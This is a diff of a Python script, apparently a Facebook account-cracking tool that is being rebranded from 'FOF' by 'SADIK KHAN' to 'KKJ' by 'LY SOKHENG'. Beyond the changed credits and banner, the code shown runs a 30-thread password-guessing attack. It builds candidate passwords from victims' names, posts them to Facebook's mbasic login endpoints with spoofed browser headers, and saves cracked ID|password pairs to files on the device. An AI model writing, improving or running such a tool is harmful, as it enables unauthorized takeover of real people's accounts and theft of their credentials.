@@ -1,7 +1,7 @@
 #FOF - _ - FILE _-_ON_-_FIRE !¡●●
-#SADIK KHAN ✌️
+#LY SOKHENG✌️
 from os import path
-import os,base64,zlib,pip,urllib,time
+import os,base64,zlib,pip,urllib,time,random
 print('[\033[1;32m✓\033[1;37m] Checking For Update !! ')
 time.sleep(1.5)
 print('[\033[1;32m✓\033[1;37m] Wait For Update Tool !! ')
@@ -12,7 +12,7 @@ print('[\033[1;32m✓\033[1;37m] Update Done \033[1;32m✓\033[1;37m Now You Can
 time.sleep(2)
 os.system(f'xdg-open https://facebook.com/groups/842909060147288/ ')
 try:
-        import os,requests,json,time,re,random,sys,uuid,string,subprocess
+        import os,requests,json,time,re,random,sys,uuid,string,subprocess,tred,ThreadPoolExecutor
         from string import *
         from concurrent.futures import ThreadPoolExecutor as tred
 except ModuleNotFoundError:
@@ -116,18 +116,20 @@ def FOFALWAYSONFIRE():
 
   os.system(f" clear")                          
   print(f"""\x1b[1;97m
-          ███████  ██████  ███████
-          ██      ██    ██ ██
-          █████   ██    ██ █████
-          ██      ██    ██ ██
-          ██       ██████  ██
+##    ## ##    ##       ## 
+##   ##  ##   ##        ## 
+##  ##   ##  ##         ## 
+#####    #####          ## 
+##  ##   ##  ##   ##    ## 
+##   ##  ##   ##  ##    ## 
+##    ## ##    ##  ######  
 \033[1;31m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\033[1;37m
- Author    : BANTU LITE
- Github    : BANTUBD
- Facebook  : SADIK KHAN
- Tool Name : FOF
+ Author    : LY SOKHENG
+ Github    : SokAlike007
+ Facebook  : LY SOKHENG
+ Tool Name : KKJ
  Tool Type : \033[1;31mTRIAL\033[1;37m
- Version   : \033[1;32m2.5\033[1;37m
+ Version   : \033[1;32m7.7\033[1;37m
 \033[1;31m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\033[1;37m""")           
   print(f"Your Key : \033[1;32m"+id)                                
   #print(f"\033[1;37mThis Tool Is Free But You Need To Access This Tool")
@@ -245,7 +247,7 @@ def Fof():
 			pcp.append(f'n')
 		else:
 			pcp.append(f'y')
-		with tred(max_workers=30) as crack_submit:
+		with tred (max_workers=30) as crack_submit:
 			clear()
 			total_ids = str(len(fo))
 			print(f' Total Account : \033[1;32m'+total_ids+f' \n \033[1;37mMethod : \033[1;32mM{mthd}\033[1;37m')
@@ -275,7 +277,7 @@ def Fof():
 				
 def m1(ids,names,passlist):
         global loop,oks,cps
-        sys.stdout.write(f'\r\r\033[1;37m [FOF] \033[1;36m•\033[1;37m %s \033[1;36m•\033[1;37m OK \033[1;36m•\033[1;37m [\033[1;32m%s\033[1;37m]'%(loop,len(oks)));sys.stdout.flush()
+        sys.stdout.write(f'\r\r\033[1;37m [KKJ] \033[1;36m•\033[1;37m %s \033[1;36m•\033[1;37m OK \033[1;36m•\033[1;37m [\033[1;32m%s\033[1;37m]'%(loop,len(oks)));sys.stdout.flush()
         session = requests.Session()
         try:
                 first = names.split(f' ')[0]
@@ -288,7 +290,7 @@ def m1(ids,names,passlist):
                 for fikr in passlist:
                	        pas = fikr.replace(f'First',first).replace(f'Last',last).replace(f'first',ps).replace(f'last',ps2)
                         ua=random.choice(ugen)
-                        head = {'Host': 'm.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="101", "Google Chrome";v="101"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform':'"Windows"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
+                        head = {'Host': 'x.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="101", "Google Chrome";v="101"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform':'"Windows"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
                         getlog = session.get(f'https://mbasic.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
                         idpass ={"lsd":re.search(f'name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search(f'name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
                         complete = session.post(f'https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
@@ -390,8 +392,8 @@ def m2(ids,names,passlist):
                                 break
                         elif 'checkpoint' in Fof:
                                 if 'y' in pcp:
-                                        print(f'\r\r\x1b[38;5;208m [FOF•CP] '+ids+' • '+pas+'\033[1;97m')
-                                        open(f'/sdcard/FOF•CP.txt', 'a').write(ids+'|'+pas+'\n')
+                                        print(f'\r\r\x1b[38;5;208m [KKJ•CP] '+ids+' • '+pas+'\033[1;97m')
+                                        open(f'/sdcard/KKJ•CP.txt', 'a').write(ids+'|'+pas+'\n')
                                         cps.append(ids)
                                         break
                                 else:
@@ -444,6 +446,5 @@ def m4(ids,names,passlist):
         except requests.exceptions.ConnectionError:
                 time.sleep(20)
         loop+=1
-
 
 Fof()
